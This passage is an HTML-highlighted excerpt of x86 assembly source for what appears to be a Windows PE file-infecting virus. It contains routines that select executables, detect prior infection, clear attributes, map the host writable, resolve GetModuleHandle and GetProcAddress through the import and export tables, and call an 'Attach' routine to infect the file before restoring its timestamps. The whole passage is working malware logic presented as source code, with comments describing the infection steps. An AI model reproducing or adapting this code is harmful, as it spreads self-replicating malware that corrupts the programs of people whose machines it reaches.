        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">uni_or_ansi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">another_ret</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Process_File2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;this function checks the file size, retrieves some key API</span><span class="sc0">
                </span><span class="sc1">;  adressez from inside the import table and infects the file.</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EBX = pointer to WIN32_FIND_DATA structure</span><span class="sc0">
                </span><span class="sc1">;  ESI = pointer to filename</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_size</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">another_ret</span><span class="sc0">             </span><span class="sc1">;if file size too short, jump</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4000000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">another_ret</span><span class="sc0">             </span><span class="sc1">;if file size too large (&gt;64MB), jump</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;check infection thru size paddin</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">another_ret</span><span class="sc0">             </span><span class="sc1">;already infected, jump</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_PE_file</span><span class="sc0">           </span><span class="sc1">;open file, check PE signature and close file</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">another_ret</span><span class="sc0">             </span><span class="sc1">;not valid PE file, jump</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">uni_or_ansi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;double-check file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">another_ret</span><span class="sc0">                             </span><span class="sc1">;discard if infected</span><span class="sc0">

</span><span class="sc5">Bless</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;this function prepares the host file for infection: blank file</span><span class="sc0">
        </span><span class="sc1">;  atributez, open and map file in r/w mode, retrieves RVA pointerz</span><span class="sc0">
        </span><span class="sc1">;  to GetModuleHandleA, GetModuleHandleW and GetProcAddress, call</span><span class="sc0">
        </span><span class="sc1">;  the "Attach" function to infect the file and finaly restore</span><span class="sc0">
        </span><span class="sc1">;  date/time stamp and attributez</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PathName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get pointer to filename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;blank file atributez</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">another_ret</span><span class="sc0">     </span><span class="sc1">;if error, jump, if disk is write-protected for example</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">virtual_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0">    </span><span class="sc1">;calculate buffer size needed for infection</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;add to original size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileAdj</span><span class="sc0">                 </span><span class="sc1">;open and map file in read/write mode</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Bless2</span><span class="sc0">                      </span><span class="sc1">;if any error, if file is locked for example, jump</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IGetProcAddressIT</span><span class="sc0">               </span><span class="sc1">;get RVA pointer to GetModuleHandleA API in the import table</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_Bless3</span><span class="sc0">                      </span><span class="sc1">;if KERNEL32 import descriptor not found, dont infect</span><span class="sc0">

        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ptrForwarderChain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;store RVA pointer to ForwarderChain field from KERNEL32 import descriptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.ID_ForwarderChain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;store RVA pointer to GetModuleHandleA API</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddForwarderChain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">;store actual ForwarderChain field value from KERNEL32 import descriptor</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">     </span><span class="sc1">;edx=0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;if RVA pointer to GetModuleHandleA found, jump and store null for GetModulehandleW RVA pointer (not needed)</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">StoreHandleW</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszGetModuleHandleW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IGetProcAddressIT</span><span class="sc0">               </span><span class="sc1">;get RVA pointer to GetProcAddress API in the import table</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;if found, jump and store GetModuleHandleW RVA pointer</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">StoreHandleW</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esi.ID_TimeDateStamp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">;shit, not found, now check if KERNEL32 API adressez are binded</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">StoreHandleW</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.ID_OriginalFirstThunk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_Bless3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esi.ID_TimeDateStamp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">StoreHandleW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetModuleHandleW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;store RVA pointer to GetModuleHandleW API</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IGetProcAddressIT</span><span class="sc0">                               </span><span class="sc1">;get RVA pointer to GetModuleHandleA API in the import table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;store RVA pointer to GetModuleHandleW API if found, store zero if not found anywayz</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Attach</span><span class="sc0">  </span><span class="sc1">;infect file</span><span class="sc0">
                        </span><span class="sc1">;at this point:</span><span class="sc0">
                        </span><span class="sc1">;  ECX = host base adress, start of memory-maped file</span><span class="sc0">
                        </span><span class="sc1">;  EDI = original file size</span><span class="sc0">

</span><span class="sc5">end_Bless3</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFileAdj</span><span class="sc0">      </span><span class="sc1">;close, unmap file and restore other setingz if necesary</span><span class="sc0">

</span><span class="sc5">end_Bless2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;get pointer to filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get original file atributez</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Bless1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;restore original file atributez</span><span class="sc0">

</span><span class="sc5">end_Bless1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">end_Process_File2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetProcAddressET</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc1">;This function is similar to GetProcAddressIT except</span><span class="sc0">
                      </span><span class="sc1">;  that it looks for API functions in the export table</span><span class="sc0">
                      </span><span class="sc1">;  of a given DLL module. It has the same functionality</span><span class="sc0">
                      </span><span class="sc1">;  as the original GetProcAddress API exported from</span><span class="sc0">
                      </span><span class="sc1">;  KERNEL32 except that it is able to find API</span><span class="sc0">
                      </span><span class="sc1">;  functions exported by ordinal from KERNEL32.</span><span class="sc0">
                      </span><span class="sc1">;on entry:</span><span class="sc0">
                      </span><span class="sc1">;  TOS+08h (Arg2): pszAPIname (pointer to API name)</span><span class="sc0">
                      </span><span class="sc1">;  TOS+04h (Arg1): module handle/base address of module</span><span class="sc0">
                      </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">
                      </span><span class="sc1">;on exit:</span><span class="sc0">
                      </span><span class="sc1">;  ECX = API function address</span><span class="sc0">
                      </span><span class="sc1">;  ECX = 0, if not found</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get Module Handle from Arg1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;get address of PE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">eax.NT_OptionalHeader</span><span class="sc0">    \ </span><span class="sc1">;get size of Export directory</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">  \
                        </span><span class="sc5">.DE_Export</span><span class="sc0">            \
                        </span><span class="sc5">.DD_Size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">          </span><span class="sc1">;size is zero, no API exported</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;get address of Export directory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">eax.NT_OptionalHeader</span><span class="sc0">    \
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">  \
                        </span><span class="sc5">.DE_Export</span><span class="sc0">            \
                        </span><span class="sc5">.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">ifdef</span><span class="sc0">   </span><span class="sc5">Ordinal</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get address of requested API from Arg2</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">10000h</span><span class="sc0">                     </span><span class="sc1">;check if Arg2 is an ordinal</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Its_API_ordinal</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">Its_API_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;get address of exported API namez</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebp.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get number of exported API namez</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">Search_for_API_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;get address of next exported API name</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get address of requested API name from Arg2</span><span class="sc0">

</span><span class="sc5">Next_Char_in_API_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;find requested API from all exported API namez</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Matched_char_in_API_name</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Search_for_API_name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">Proc_Address_not_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;API not found</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">End_GetProcAddressET</span><span class="sc0">

</span><span class="sc9">ifdef</span><span class="sc0">   </span><span class="sc5">Ordinal</span><span class="sc0">

</span><span class="sc5">Its_API_ordinal</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.ED_BaseOrdinal</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;normalize Ordinal, i.e. convert it to an index</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Index</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">Matched_char_in_API_name</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;end of API name reached ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Next_Char_in_API_name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;get address of exported API ordinalz</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get index into exported API functionz</span><span class="sc0">

</span><span class="sc5">Check_Index</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;check for out of range index</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;get address of exported API functionz</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get address of requested API function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;take care of forwarded API functionz</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">

</span><span class="sc5">End_GetProcAddressET</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Pushad_ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;set requested Proc Address, if found</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Ret2Pshd</span><span class="sc0">

</span><span class="sc5">GetProcAddressET</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">goto_GetProcAddressET</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetProcAddressET</span><span class="sc0">

</span><span class="sc5">MyGetProcAddressK32</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;this function is simply a wraper to the GetProcAddress</span><span class="sc0">
                        </span><span class="sc1">;  API. It retrieves the address of an API function</span><span class="sc0">
                        </span><span class="sc1">;  exported from KERNEL32.</span><span class="sc0">
                        </span><span class="sc1">;on entry:</span><span class="sc0">
                        </span><span class="sc1">;  EBX = KERNEL32 module handle</span><span class="sc0">
                        </span><span class="sc1">;  ESI = pszAPIname (pointer to API name)</span><span class="sc0">
                        </span><span class="sc1">;on exit:</span><span class="sc0">
                        </span><span class="sc1">;  ECX = API function address</span><span class="sc0">
                        </span><span class="sc1">;  ECX = 0, if not found</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">MyGetProcAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">   </span><span class="sc1">;this function retrieves API adressez from KERNEL32</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;this dynamic variable will hold an RVA pointer to the GetProcAddress API in the IAT</span><span class="sc0">
</span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">goto_GetProcAddressET</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">phost_hdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;call the original GetProcAddress API</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">goto_GetProcAddressET</span><span class="sc0">   </span><span class="sc1">;if error, call my own GetProcAddress function</span><span class="sc0">

</span><span class="sc5">Ret2Pshd</span><span class="sc4">:</span><span class="sc0">

